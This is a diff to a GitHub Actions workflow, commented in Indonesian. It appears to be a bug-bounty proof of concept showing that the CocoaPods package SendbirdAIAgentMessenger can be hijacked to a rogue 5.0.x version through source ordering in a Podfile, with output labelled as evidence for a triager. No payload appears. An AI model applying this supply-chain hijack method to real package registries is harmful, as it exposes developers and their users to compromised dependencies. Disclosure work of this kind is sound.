@@ -8,44 +8,46 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Force Create Minimal Xcode Structure
+      - name: Setup Headless Pod Test
         run: |
-          # 1. Bikin folder project manual
-          mkdir -p DummyProject/DummyProject
-          cd DummyProject
+          mkdir -p TrialRun
+          cd TrialRun
           
-          # 2. Setup Git Credentials biar CocoaPods gak rewel
-          git config --global user.email "attacker@researcher.com"
+          # Setup Git
+          git config --global user.email "researcher@test.com"
           git config --global user.name "Researcher"
 
-          # 3. Bikin file .xcodeproj palsu (ini kuncinya biar pod install mau jalan)
-          # Kita bikin direktori xcodeproj agar CocoaPods mendeteksi ada "project"
-          mkdir -p DummyProject.xcodeproj
-
-          # 4. Tulis Podfile yang ngebajak Sendbird
+          # Tulis Podfile MODE HEADLESS (Tanpa Xcode Project)
           cat <<EOF > Podfile
+          # PENTING: Kita kasih tahu CocoaPods untuk gak nyari project Xcode
+          install! 'cocoapods', :integrate_targets => false
+
           source 'https://github.com/sendbird/sendbird-ios-distribution.git'
           source 'https://cdn.cocoapods.org/'
+
           platform :ios, '15.0'
-          target 'DummyProject' do
+
+          target 'PoCSimulation' do
             use_frameworks!
-            # Ini yang bakal narik versi 5.0.x lu
+            # Target utama pembajakan
             pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
           end
           EOF
 
-      - name: Pod Install & Hijack Verification
+      - name: Execution & Hijack Proof
         run: |
-          cd DummyProject
-          # 5. Jalankan install tanpa perlu interaksi manusia
+          cd TrialRun
+          # Jalankan install dengan verbose biar keliatan alur downloadnya
           pod install --repo-update --verbose
           
-          echo "--- FINAL EVIDENCE ---"
-          # 6. Buktiin ke Tal kalau v5.0.x yang menang
-          if grep -q "SendbirdAIAgentMessenger (5.0." Podfile.lock; then
-            echo "SUCCESS: Hijacked version is installed!"
-            cat Podfile.lock | grep SendbirdAIAgentMessenger
-          else
-            echo "FAILED: Version mismatch."
+          echo "--- BUKTI FINAL UNTUK TRIAGER ---"
+          if [ -f Podfile.lock ]; then
             cat Podfile.lock
+            if grep -q "5.0." Podfile.lock; then
+              echo "✅ SUCCESS: Pod Sendbird berhasil dibajak ke versi 5.0.x!"
+            else
+              echo "❌ FAILED: Masih menggunakan versi resmi."
+            fi
+          else
+            echo "❌ ERROR: Podfile.lock tidak ter-generate."
           fi
